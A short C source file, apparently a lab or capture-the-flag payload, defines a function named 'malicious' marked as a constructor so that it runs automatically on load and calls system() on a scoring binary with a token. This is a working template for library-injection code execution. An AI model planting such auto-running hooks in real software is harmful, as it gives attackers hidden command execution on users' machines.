	#include<stdio.h>
	#include<stdlib.h>
	 
	static void malicious() __attribute__((constructor));
	 
	void malicious() {
	    system("/usr/local/bin/score 77691372-ef0c-4cb8-aca8-b612d0112780");
	}